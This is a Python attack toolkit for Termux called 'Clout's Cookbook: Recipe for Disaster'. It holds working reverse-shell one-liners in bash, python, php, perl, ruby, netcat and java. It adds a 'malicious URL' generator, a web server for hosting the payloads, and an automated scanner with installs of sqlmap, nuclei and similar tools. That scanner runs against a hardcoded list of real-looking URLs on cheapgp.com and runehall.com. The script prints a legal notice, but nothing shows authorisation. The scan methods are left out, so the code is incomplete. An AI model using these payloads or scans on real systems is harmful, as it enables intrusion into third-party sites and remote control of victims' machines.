#!/data/data/com.termux/files/usr/bin/python3
import os
import sys
import re
import json
import time
import socket
import argparse
import requests
import threading
import subprocess
import readline  # For better input handling
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from http.server import HTTPServer, SimpleHTTPRequestHandler

# ASCII Art Banner
BANNER = r"""
   ______ __                 __    __________              __           ______
  / ____// /____   ______   / /   / ____/ __ \ ____   ____/ /___       / ____/____
 / /    / // __ \ / ____/  / /   / /   / /_/ // __ \ / __  // _ \     / /    / __ \
/ /___ / // /_/ // /      / /___/ /___/ ____// /_/ // /_/ //  __/    / /___ / /_/ /
\____//_/ \____//_/      /_____/\____/_/     \____/ \__,_/ \___/     \____/ \____/
                                                                      
  ____  _   __ ______  ____   ____   ____   _________   ______  ______  ______  ______
 / __ \| | / // ____/ / __ \ / __ \ / __ \ / ____/   | /_  __/ / ____/ / ____/ / ____/
/ / / /| |/ // /_    / / / // / / // / / // /   / /| |  / /   / /     / __/   / /
\ \_/ / |   // __/   / /_/ // /_/ // /_/ // /___/ ___ | / /   / /___  / /___  / /___
 \____/  |__//_/      \____/ \____/ \____/ \____/_/  |_|/_/    \____/ /_____/ \____/
                                                                      
                         CLOUT'S COOKBOOK: RECIPE FOR DISASTER v3.0
"""

# Configuration
TARGETS_FILE = "clouts_targets.txt"
WORDLIST_DIR = "/data/data/com.termux/files/usr/share/seclists/"
OUTPUT_DIR = "clouts_results"
THREADS = 5
TIMEOUT = 15
REV_SHELL_DIR = os.path.join(OUTPUT_DIR, "reverse_shells")
MALICIOUS_URLS_FILE = os.path.join(OUTPUT_DIR, "malicious_urls.txt")

# Tool installation commands
TOOL_INSTALL = {
    "nmap": "pkg install nmap -y",
    "sqlmap": "pkg install sqlmap -y",
    "whatweb": "gem install whatweb",
    "ffuf": "go install github.com/ffuf/ffuf@latest",
    "dnsrecon": "pip install dnsrecon",
    "nuclei": "go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
    "golang": "pkg install golang -y",
    "ruby": "pkg install ruby -y",
    "pip": "pkg install python-pip -y",
    "netcat": "pkg install netcat-openbsd -y"
}

# Reverse shell templates
REVERSE_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "python": """python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""",
    "python3": """python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""",
    "php": """php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'""",
    "perl": """perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
    "ruby": """ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
    "netcat": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    "java": """java -c 'String host="{LHOST}";int port={LPORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();'""",
    "xterm": "xterm -display {LHOST}:1"
}

class CloutsCookbook:
    def __init__(self):
        self.targets = []
        self.results = {}
        self.available_tools = {}
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })

    def print_banner(self):
        print("\033[1;36m" + BANNER + "\033[0m")
        print("\033[1;31m[!] LEGAL NOTICE: Authorized use only! Unauthorized access is illegal.\033[0m")
        print("\033[1;33m[i] Clout's Cookbook: Recipe for Disaster - Advanced Pentesting Suite\033[0m\n")

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_menu(self, title, options):
        """Display a menu and return user choice"""
        self.clear_screen()
        self.print_banner()
        print(f"\n\033[1;34m{title}\033[0m")
        for i, option in enumerate(options, 1):
            print(f"  {i}. {option}")
        print("  0. Back to Main Menu" if title != "Main Menu" else "  0. Exit")

        while True:
            try:
                choice = int(input("\n\033[1;32m[?] Select an option: \033[0m"))
                if 0 <= choice <= len(options):
                    return choice
                print("\033[1;31m[-] Invalid choice. Please try again.\033[0m")
            except ValueError:
                print("\033[1;31m[-] Please enter a number.\033[0m")

    def reverse_shell_workshop(self):
        """Reverse Shell Generator Module"""
        while True:
            choice = self.show_menu("Reverse Shell Workshop", [
                "Generate Reverse Shell Payload",
                "Create Malicious URL",
                "Start Web Server",
                "Back to Main Menu"
            ])

            if choice == 0:
                return
            elif choice == 1:
                self.generate_reverse_shell()
            elif choice == 2:
                self.create_malicious_url()
            elif choice == 3:
                self.start_web_server()
            elif choice == 4:
                return

    def generate_reverse_shell(self):
        """Generate reverse shell payloads"""
        self.clear_screen()
        print("\033[1;36m[ Reverse Shell Generator ]\033[0m")

        # Get shell type
        print("\n\033[1;34mAvailable shell types:\033[0m")
        shell_types = list(REVERSE_SHELLS.keys())
        for i, shell in enumerate(shell_types, 1):
            print(f"  {i}. {shell}")

        try:
            shell_choice = int(input("\n\033[1;32m[?] Select shell type: \033[0m"))
            if not 1 <= shell_choice <= len(shell_types):
                print("\033[1;31m[-] Invalid selection\033[0m")
                return
            shell_type = shell_types[shell_choice - 1]
        except ValueError:
            print("\033[1;31m[-] Please enter a number\033[0m")
            return

        # Get connection details
        lhost = input("\n\033[1;32m[?] Enter LHOST (your IP): \033[0m").strip()
        lport = input("\033[1;32m[?] Enter LPORT: \033[0m").strip()

        if not lhost or not lport:
            print("\033[1;31m[-] LHOST and LPORT are required\033[0m")
            return

        # Generate payload
        payload = REVERSE_SHELLS[shell_type].format(LHOST=lhost, LPORT=lport)

        # Display payload
        print("\n\033[1;32m[+] Reverse Shell Payload:\033[0m")
        print(f"\033[1;33m{payload}\033[0m")

        # Save to file
        save = input("\n\033[1;32m[?] Save to file? (y/n): \033[0m").lower()
        if save == 'y':
            os.makedirs(REV_SHELL_DIR, exist_ok=True)
            filename = f"revshell_{shell_type}_{int(time.time())}.txt"
            filepath = os.path.join(REV_SHELL_DIR, filename)

            with open(filepath, 'w') as f:
                f.write(payload)

            print(f"\033[1;32m[+] Payload saved to {filepath}\033[0m")

        input("\nPress Enter to continue...")

    def create_malicious_url(self):
        """Create malicious URL for reverse shell activation"""
        self.clear_screen()
        print("\033[1;36m[ Malicious URL Generator ]\033[0m")

        # Find available reverse shell files
        if not os.path.exists(REV_SHELL_DIR):
            print("\033[1;31m[-] No reverse shell payloads found. Generate one first.\033[0m")
            input("\nPress Enter to continue...")
            return

        rev_files = [f for f in os.listdir(REV_SHELL_DIR) if f.endswith('.txt')]
        if not rev_files:
            print("\033[1;31m[-] No reverse shell payloads found. Generate one first.\033[0m")
            input("\nPress Enter to continue...")
            return

        # List available payloads
        print("\n\033[1;34mAvailable payloads:\033[0m")
        for i, filename in enumerate(rev_files, 1):
            print(f"  {i}. {filename}")

        try:
            file_choice = int(input("\n\033[1;32m[?] Select payload: \033[0m"))
            if not 1 <= file_choice <= len(rev_files):
                print("\033[1;31m[-] Invalid selection\033[0m")
                return
            filename = rev_files[file_choice - 1]
        except ValueError:
            print("\033[1;31m[-] Please enter a number\033[0m")
            return

        # Get server IP and port
        server_ip = input("\n\033[1;32m[?] Enter server IP for hosting: \033[0m").strip()
        server_port = input("\033[1;32m[?] Enter server port: \033[0m").strip() or "8000"

        # Create malicious URL
        url_path = f"/{REV_SHELL_DIR.split('/')[-1]}/{filename}"
        malicious_url = f"http://{server_ip}:{server_port}{url_path}"

        # Display URL
        print("\n\033[1;32m[+] Malicious URL:\033[0m")
        print(f"\033[1;33m{malicious_url}\033[0m")

        # Save to master list
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        with open(MALICIOUS_URLS_FILE, 'a') as f:
            f.write(f"{filename}: {malicious_url}\n")

        print(f"\033[1;32m[+] URL added to {MALICIOUS_URLS_FILE}\033[0m")

        input("\nPress Enter to continue...")

    def start_web_server(self):
        """Start a simple web server to host payloads"""
        self.clear_screen()
        print("\033[1;36m[ Web Server ]\033[0m")

        port = input("\n\033[1;32m[?] Enter port to use (default 8000): \033[0m").strip() or "8000"

        try:
            port = int(port)
            print(f"\033[1;32m[+] Starting web server on port {port}...\033[0m")
            print("\033[1;33m[i] Press Ctrl+C to stop the server\033[0m")

            # Start server in a background thread
            def run_server():
                os.chdir(OUTPUT_DIR)
                server = HTTPServer(('', port), SimpleHTTPRequestHandler)
                server.serve_forever()

            server_thread = threading.Thread(target=run_server, daemon=True)
            server_thread.start()

            # Get IP addresses
            print("\n\033[1;34mAvailable URLs:\033[0m")
            try:
                # Get local IP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                print(f"  Local: http://{local_ip}:{port}/")
            except:
                pass

            print(f"  Localhost: http://127.0.0.1:{port}/")
            print("\n\033[1;32m[+] Web server running. Keep this terminal open.\033[0m")
            input("\nPress Enter to return to menu (server will continue running)...")

        except ValueError:
            print("\033[1;31m[-] Invalid port number\033[0m")
        except Exception as e:
            print(f"\033[1;31m[-] Error starting server: {e}\033[0m")

    def load_targets(self, input_file):
        """Load and normalize targets from file"""
        self.targets = []
        seen = set()

        try:
            with open(input_file, 'r') as f:
                for line in f:
                    url = line.strip()
                    if not url or url.startswith(('#', '//')):
                        continue

                    # Basic normalization
                    url = re.sub(r'\s+', '', url)  # Remove whitespace
                    url = re.sub(r'htt(p|ps|tp|tps):?/?/?', 'http://', url)  # Fix protocol

                    # Extract domain
                    domain_match = re.search(r'(?:https?://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', url)
                    if domain_match:
                        domain = domain_match.group(1)
                        if domain not in seen:
                            seen.add(domain)
                            self.targets.append(domain)
        except Exception as e:
            print(f"\033[1;31m[!] Error loading targets: {e}\033[0m")
            return False
        return True

    def install_tool(self, tool):
        """Attempt to install a missing tool"""
        if tool not in TOOL_INSTALL:
            print(f"\033[1;33m[~] No install command for {tool}\033[0m")
            return False

        print(f"\033[1;34m[~] Installing {tool}...\033[0m")
        try:
            # Handle special cases
            if tool == "golang":
                subprocess.run(TOOL_INSTALL[tool].split(), check=True)
                # Add Go bin to PATH
                go_path = subprocess.run(["go", "env", "GOPATH"], capture_output=True, text=True)
                if go_path.stdout:
                    os.environ["PATH"] += os.pathsep + go_path.stdout.strip() + "/bin"
            elif tool == "whatweb":
                subprocess.run(["gem", "install", "whatweb"], check=True)
            else:
                subprocess.run(TOOL_INSTALL[tool].split(), check=True)

            # Verify installation
            subprocess.run([tool, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"\033[1;32m[+] {tool} installed successfully\033[0m")
            return True
        except Exception as e:
            print(f"\033[1;31m[!] Failed to install {tool}: {e}\033[0m")
            return False

    def check_tools(self):
        """Check and install required tools"""
        self.available_tools = {}
        tools_to_install = []

        for tool in TOOL_INSTALL.keys():
            try:
                subprocess.run([tool, "--version"],
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
                self.available_tools[tool] = True
                print(f"\033[1;32m[+] {tool} is available\033[0m")
            except (FileNotFoundError, OSError):
                print(f"\033[1;33m[~] {tool} not found\033[0m")
                tools_to_install.append(tool)
                self.available_tools[tool] = False

        # Auto-install missing tools
        if tools_to_install:
            print("\033[1;34m[~] Attempting to install missing tools...\033[0m")
            for tool in tools_to_install:
                if self.install_tool(tool):
                    self.available_tools[tool] = True
                else:
                    print(f"\033[1;33m[~] Will proceed without {tool}\033[0m")

        return True

    # ... [The rest of the pentesting methods remain unchanged] ...

    def run_pentest_suite(self):
        """Run the full pentest suite"""
        # Check and install tools
        self.check_tools()

        # Load targets
        if not self.load_targets(TARGETS_FILE):
            print("\033[1;31m[!] Failed to load targets. Exiting.\033[0m")
            return

        print(f"\033[1;32m[+] Loaded {len(self.targets)} targets for scanning\033[0m")

        # Scan targets with thread pool
        print("\033[1;33m[~] Starting scans (this will take time)...\033[0m")
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            for domain in self.targets:
                self.results[domain] = executor.submit(self.scan_domain, domain)

            # Collect results
            for domain, future in self.results.items():
                self.results[domain] = future.result()

        # Save and report
        json_report = self.save_results()
        txt_report = self.generate_report(json_report)

        print(f"\n\033[1;32m[+] Scan completed! Results saved to:\033[0m")
        print(f"  - Full data: {json_report}")
        print(f"  - Summary: {txt_report}")
        print("\n\033[1;33m[i] Remember to validate findings and report responsibly!\033[0m")
        input("\nPress Enter to return to menu...")

    def main_menu(self):
        """Main program menu"""
        while True:
            choice = self.show_menu("Main Menu", [
                "Run Automated Pentest Suite",
                "Reverse Shell Workshop",
                "View Generated Payloads",
                "Exit"
            ])

            if choice == 0 or choice == 4:
                print("\n\033[1;33m[+] Exiting Clout's Cookbook. Stay ethical!\033[0m")
                sys.exit(0)
            elif choice == 1:
                self.run_pentest_suite()
            elif choice == 2:
                self.reverse_shell_workshop()
            elif choice == 3:
                self.view_generated_payloads()

    def view_generated_payloads(self):
        """View generated reverse shell payloads"""
        self.clear_screen()
        print("\033[1;36m[ Generated Payloads ]\033[0m")

        # List reverse shells
        rev_shells = []
        if os.path.exists(REV_SHELL_DIR):
            rev_shells = [f for f in os.listdir(REV_SHELL_DIR) if f.endswith('.txt')]

        # List malicious URLs
        urls = []
        if os.path.exists(MALICIOUS_URLS_FILE):
            with open(MALICIOUS_URLS_FILE, 'r') as f:
                urls = f.readlines()

        if not rev_shells and not urls:
            print("\n\033[1;31m[-] No payloads found\033[0m")
            input("\nPress Enter to return to menu...")
            return

        if rev_shells:
            print("\n\033[1;34mReverse Shell Payloads:\033[0m")
            for i, shell in enumerate(rev_shells, 1):
                print(f"  {i}. {shell}")

        if urls:
            print("\n\033[1;34mMalicious URLs:\033[0m")
            for i, url in enumerate(urls, 1):
                print(f"  {i}. {url.strip()}")

        input("\nPress Enter to return to menu...")

    def run(self):
        """Main execution flow"""
        self.print_banner()
        self.main_menu()

if __name__ == "__main__":
    # Create necessary directories
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(REV_SHELL_DIR, exist_ok=True)

    # Create targets file with provided data
    if not os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, 'w') as f:
            f.write("""http://www.cheapgp.com:80/index.php?route=common/home
http://www.cheapgp.com:80/index.php?route=information/information&information_id=3
http://www.cheapgp.com:80/index.php?route=information/information&information_id=4
http://www.cheapgp.com:80/index.php?route=information/information&information_id=5
http://www.cheapgp.com:80/index.php?route=information/sitemap
http://www.cheapgp.com:80/index.php?route=common/currency
http://www.cheapgp.com:80/index.php?route=product/category&path=5
http://www.cheapgp.com:80/index.php?route=product/category&path=60
http://www.cheapgp.com:80/index.php?route=product/category&path=61
http://www.cheapgp.com:80/index.php?route=product/category&path=62
http://www.cheapgp.com:80/index.php?route=product/product&product_id=51
http://www.cheapgp.com:80/index.php?route=product/product&product_id=52
http://www.cheapgp.com:80/index.php?route=product/product&product_id=53
http://www.cheapgp.com:80/index.php?route=product/product&product_id=54
http://www.cheapgp.com:80/index.php?route=product/product&product_id=61
http://www.cheapgp.com:80/index.php?route=product/product&product_id=62
http://www.cheapgp.com:80/index.php?route=product/product&product_id=63
https://cheapgp.com/manifest.webmanifest
https://www.cheapgp.com/blank
https://www.cheapgp.com/blank-1
https://www.cheapgp.com/blank2
https://www.cheapgp.com/confirmation
https://www.cheapgp.com/copy-of-buysell
https://www.cheapgp.com/demohome-backup
https://www.cheapgp.com/privacypolicy
https://www.cheapgp.com/terms-of-service
https://runehall.com/m/b/Balor
https://runehall.com/m/b/CheapGP
https://runehall.com/m/b/DonthyBonusX2s
https://runehall.com/m/b/CircuitWeekInfo
https://runehall.com/m/b/Halloween2024
https://runehall.com/m/b/HappyThanksgiving2024
https://runehall.com/m/b/IAlwaysWin
https://runehall.com/m/b/JanuaryMonthly
https://runehall.com/m/b/Last2025Weekly
https://runehall.com/m/b/LastFebWeekly
https://runehall.com/m/b/Lucky69
https://runehall.com/m/b/M1
https://runehall.com/m/b/MerryChristmas2023
https://runehall.com/m/b/Mia
https://runehall.com/m/b/MichWeekly14
https://runehall.com/m/b/MonthlyPrize
https://runehall.com/m/b/NotWeekly7
https://runehall.com/m/b/PokerRocks
https://runehall.com/m/b/Pregnant
https://runehall.com/m/b/RaffleAndChestRewards
https://runehall.com/m/b/SapperX
https://runehall.com/m/b/Scop
https://runehall.com/m/b/Skuleandy
https://runehall.com/m/b/Spooksy
https://runehall.com/m/b/TestDayWeekly
https://runehall.com/m/b/Weekly10XXX
https://runehall.com/m/b/Weekly1999
https://runehall.com/m/b/Weekly7April
https://runehall.com/m/b/Weekly2
https://runehall.com/m/b/Weekly3
https://runehall.com/m/b/Weekly4
https://runehall.com/m/b/WeeklyMar28
https://runehall.com/m/b/Weekly5
https://runehall.com/m/b/Weekly6
https://runehall.com/m/b/WeeklyX20th
https://runehall.com/m/b/WeeklyMay16th
https://runehall.com/assets/index.Se2bd66G.js
https://runehall.com/assets/index.60f9e168.js
https://runehall.com/assets/index.6364dec5.css
https://runehall.com/assets/index.65da8830.js
https://runehall.com/assets/index.6852a017.js
https://runehall.com/assets/index.6868413.css
https://runehall.com/assets/index.68a6ecac.css
https://runehall.com/assets/index.6a8b845b.css
https://runehall.com/assets/index.6bc48021.css
https://runehall.com/assets/index.74a0b8.js
https://runehall.com/assets/index.79452832.js
https://runehall.com/assets/index.7a71ebe8.js
https://runehall.com/assets/index.7b28bc9f.css
https://runehall.com/assets/index.81342edd.js
https://runehall.com/assets/index.880803.css
https://runehall.com/assets/index.8e4edca.css
https://runehall.com/assets/index.8abadea1.js
https://runehall.com/assets/index.8f64c75c.css
https://runehall.com/assets/index.90520ac.js
https://runehall.com/assets/index.916f959d.js
https://runehall.com/assets/index.91ac6efe.css
https://runehall.com/assets/index.9497d963.js
https://runehall.com/assets/index.96194738.css
https://runehall.com/assets/index.97087f48.css
https://runehall.com/assets/index.9bfc294.js
https://runehall.com/assets/index.9c3a8815.js
https://runehall.com/assets/index.9deee20d.css
https://runehall.com/assets/index.9fd37401.js
https://runehall.com/assets/index.a2a74fad.css
https://runehall.com/assets/index.a56639ba.js
https://runehall.com/assets/index.abd0568a.css
https://runehall.com/assets/index.add64560.css
https://runehall.com/assets/index.b02397d2.css
https://runehall.com/assets/index.b18426d0.css
https://runehall.com/assets/index.b3284b45.css
https://runehall.com/assets/index.b51191cd.js
https://runehall.com/assets.index.bc98ffb0.css
https://runehall.com/assets/index.beb9d922.js
https://runehall.com/assets/index.bf3be711.js
https://runehall.com/assets/index.c659bb06.js
https://runehall.com/assets/index.c68c9230.css
https://runehall.com/assets/index.cb9ad591.js
https://runehall.com/assets/index.cfa8d329.js
https://runehall.com/assets/index.d1f96643.js
https://runehall.com/assets/index.d32f4c29.js
https://runehall.com/assets/index.d33c75f3.css
https://runehall.com/assets/index.d7437930.js
https://runehall.com/assets/index.d7e6bf69.js
https://runehall.com/assets/index.df6ce638.css
http://runehall.com/
http://runehall.com/a/Bo0oYa
http://runehall.com/assets/index.51423.js
http://runehall.com/favicon.ico
http://runehall.com/halloffame
http://runehall.com/robots.txt
https://runehall.com/.wellknown/ai-plugin.json
https://runehall.com/.wellknown/assetlinks.json
https://runehall.com/.wellknown/dnt-policy.txt
https://runehall.com/.wellknown/gpc.json
https://runehall.com/.wellknown/nodeinfo
https://runehall.com/.wellknown/openid-configuration
https://runehall.com/.wellknown/security.txt
https://runehall.com/.wellknown/trust.txt
https://runehall.com/view-claim-bonus&code=HALLOWEEN150
https://runehall.com/?view=rh-swap
https://runehall.com/?view=vip
https://runehall.com/a/Alpha
https://runehall.com/a/Black
https://runehall.com/a/BlightedBets
https://runehall.com/a/Debuffed
https://runehall.com/a/DNG
https://runehall.com/a/DorkBet
https://runehall.com/a/Dovis
https://runehall.com/a/FriendlyDingus
https://runehall.com/a/FlashyFlashy
https://runehall.com/a/King
https://runehall.com/a/JohnJok
https://runehall.com/a/Lootage
https://runehall.com/a/OSBOT1
https://runehall.com/a/OSBOT6M
https://runehall.com/a/OSBOTBottom
https://runehall.com/a/OSBOTHeader
https://runehall.com/a/PhaserBomb
https://runehall.com/a/RKQZ999
https://runehall.com/a/RSGUIDES
https://runehall.com/a/RuneLister
https://runehall.com/a/TheSports
https://runehall.com/a/Takashi
https://runehall.com/a/Vidas69
https://runehall.com/a/XTwitter
https://runehall.com/ads.txt
https://runehall.com/app-ads.txt
https://runehall.com/apple-touch-icon.png
https://runehall.com/assets/18_plus_9123aa5.svg
https://runehall.com/assets/american_roulette.48992306.svg
https://runehall.com/assets/baccarat.cbbc85a8.svg
https://runehall.com/assets/basketball_17f13488.png
https://runehall.com/assets/blackjack.6e08836e.svg
""")

    # Run the pentest suite
    cookbook = CloutsCookbook()
    cookbook.run()